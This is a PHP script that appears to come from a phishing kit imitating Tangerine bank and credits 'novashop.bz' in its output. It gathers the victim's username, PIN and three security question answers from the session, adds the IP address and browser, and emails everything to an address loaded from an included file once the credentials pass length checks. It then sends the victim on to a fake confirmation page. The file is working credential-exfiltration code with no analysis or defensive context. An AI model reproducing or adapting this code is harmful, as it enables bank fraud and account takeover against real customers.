<?php
session_start();
error_reporting(0);



$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults---------------------\n";
$message .= "username : ".$_SESSION['username']."\n";
$message .= "pin : ".$_SESSION['pin']."\n";
$message .= "-----------------2 QuestionsResults-----------------\n";
$message .= "question : ".$_SESSION['question1']."\n";
$message .= "answer : ".$_SESSION['answer1']."\n";
$message .= "question : ".$_SESSION['question2']."\n";
$message .= "answer : ".$_SESSION['answer2']."\n";
$message .= "question : ".$_SESSION['question3']."\n";
$message .= "answer : ".$_SESSION['answer3']."\n";
$message .= "-----------------created by novashop.bz-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";
$user= $_SESSION['username'];
$pass = $_SESSION['pin'];
$subject = "Tang $IP $user $pass   ";

include "email.php";
include('blocker.php');



if (strlen($user) >= 6 && strlen($user) <= 16 && strlen($pass)>=4 && strlen($pass)<=6 ) {
   mail($send,$subject,$message);
    
}



?>
<script>
    window.top.location.href = "confirmation.php";

</script>